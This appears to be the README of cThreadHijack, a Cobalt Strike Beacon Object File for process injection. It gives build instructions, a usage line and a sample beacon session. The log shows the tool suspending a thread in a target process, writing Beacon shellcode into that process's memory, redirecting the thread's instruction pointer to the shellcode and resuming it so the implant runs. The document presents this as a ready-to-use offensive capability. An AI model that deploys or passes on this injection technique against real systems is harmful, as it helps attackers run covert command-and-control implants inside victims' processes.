
### BUILDING: ###
1. On a Windows machine, open a `x64 Native Tools Command Prompt for VS` prompt. This can be done by pressing the Windows key and typing `x64 Native Tools` and selecting the prompt.
2. Change directory to `C:\path\to\cThreadHijack`.
3. `nmake -f Makefile.msvc build`

### USAGE: ###
`cThreadHijack PID LISTENER_NAME`

```
beacon> cThreadHijack 7340 TESTING
[+] host called home, sent: 268433 bytes
[+] received output:
[+] Target process PID: 7340

[+] received output:
[+] Opened a handle to PID 7340

[+] received output:
[+] Found a thread in the target process! Thread ID: 10212

[+] received output:
[+] Suspending the targeted thread...

[+] received output:
[+] Wrote Beacon shellcode to the remote process!

[+] received output:
[+] Virtual memory for CreateThread and NtContinue routines allocated at 0x201f4ab0000 inside of the remote process!

[+] received output:
[+] Size of NtContinue routine: 64 bytes
[+] Size of CONTEXT structure: 1232 bytes
[+] Size of stack alignment routine: 4
[+] Size of CreateThread routine: 64
[+] Size of shellcode: 261632 bytes

[+] received output:
[+] Wrote payload to buffer to previously allocated buffer inside of!

[+] received output:
[+] Current RIP: 0x7ffa55df69a4

[+] received output:
[+] Successfully pointed the target thread's RIP register to the shellcode!

[+] received output:
[+] Current RIP: 0x201f4ab0000

[+] received output:
[+] Resuming the thread! Please wait a few moments for the Beacon payload to execute...
```

